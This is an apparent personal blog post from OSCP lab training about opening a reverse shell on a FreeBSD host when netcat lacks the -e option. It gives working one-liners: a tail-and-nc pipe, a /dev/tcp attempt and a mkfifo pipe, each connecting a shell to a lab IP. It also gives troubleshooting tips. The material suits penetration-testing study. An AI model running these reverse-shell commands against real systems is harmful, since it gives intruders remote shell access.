---
title: 'Using netcat without -e'
date: 2017-08-26 01:37
categories: security
tags: netcat hack learn
featured_image: '/images/posts/netcat-a-swiss-army-tool-1-638.jpg'
lead_text: 'Okay, okay, this is some kind of insiders thing. If you dont know what Im talking about from the title of this article, then there is nothing to see. Please move along!'
---

Recently in my OSCP course, I was struggeling a few hours to get a reversed shell connection. It was a FreeBSD box, not quite my expertise. Finally I came up with a simple solution using _tail -f_.

<img src="/images/posts/netcat_freebsd.jpg" 
     alt="Netcat on FreeBSD"
     class="media pull-right img-thumbnail">
I immediately found that netcat was installed, but ofcourse [without the e-option](https://www.google.nl/search?q=netcat+GAPING_SECURITY_HOLE).
All references to netcat without -e suggest you use a backpipe 
to relay standard output from commands piped from netcat to `/bin/bash`
back into netcat. After trying harder for many many many tries, I finally 
came up with the following simple solution.

1. Use _tail -f_ to feed commands from a temporary file to bash. (Using _-n 0_ to ignore any current content of the temporary file.)
2. Redirect the output of the shell command to netcat.
3. Redirect the output of netcat to the temporary file, so the tail command picks it up...

The result looks like:

```console
tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 10.11.0.49 443 1> /tmp/1
```

That's awsome! But don't forget, all your commands are stored in the /tmp/1 file... (ツ)

From many other options I found, none seemed to work. A quick test showed that the famous 
[/dev/tcp/&lt;ip&gt;/&lt;port&gt;](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) 
did not work either. The following command did not result in any response on my machine.

```console
echo foo > /dev/tcp/10.11.0.13/443
```

Ofcourse, after having rooted the machine, I was still wondering whether other options found on the internet could work too. In my case I was able to execute multiple commands by separating them with a semicolon. This way a pipe is created first, followed by: netcat reading input from that pipe, netcat redirecting output to bash, bash redirecting stderr and stdout to the pipe again.

```console
mkfifo pipe; nc -nv 10.11.0.13 443 < pipe | /bin/sh 2>pipe >pipe 
```

## Wrap up
To wrap up, which things slowed me down finding a way to obtain a reverse shell?
1. Not understanding the _mkfifo pipe_ command. This command makes a pipe in the _current_ directory. So not having any rights there, just really does not help...
2. Forgetting that the & character should be url encoded _and_ not by using &amp;. This made me lose the stderr output, that just really does not help either...
3. When _uname -a_ gives back "FreeBSD ... amd64" you probably should not try your Linux/x86 binaries. Oke, but where/how do I get a FreeBSD/amd64 payload?
4. Oh, and last: _chmod +x_ did not work, _chmod 777_ did the job... (◔_◔)

_If at first you don't succeed, try, try, try harder!_
